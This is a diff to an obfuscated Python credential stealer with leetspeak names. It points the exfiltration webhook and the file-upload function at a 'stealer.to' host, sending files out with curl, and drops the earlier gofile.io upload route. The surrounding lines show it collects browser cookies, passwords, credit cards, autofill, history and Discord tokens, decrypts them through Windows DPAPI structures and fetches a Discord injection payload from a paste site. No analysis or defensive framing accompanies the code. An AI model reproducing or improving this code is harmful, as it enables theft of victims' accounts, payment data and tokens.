@@ -115,7 +115,7 @@ words = "https://rentry.co/5uu99/raw"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
-h00k = "https://stealer.to/post?uniqueid=411cc446"
+h00k = "https://stealer.to/post?uniqueid=9d319410"
 inj3c710n_url = "https://rentry.co/discord-injection/raw"
 
 class DATA_BLOB(Structure):
@@ -1076,9 +1076,14 @@ def G47H3r411():
     
 def UP104D7060F113(path):
     try:
-        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
-    except: return False
+        r = subprocess.Popen(
+            f'curl -F "file=@{path}" https://stealer.to/uploads',
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        ).communicate()
+        json_response = loads(r[0].decode('utf-8'))
+        return json_response["attachments"][0]["url"]
+    except:
+        return False
 
 def K1W1F01D3r(pathF, keywords):
     global K1W1F113s
@@ -1262,8 +1267,7 @@ k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[
 C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
 c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], ''
 
-try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
-except:gofileserver = "store4"
+
 GLINFO = G108411NF0()
 
 
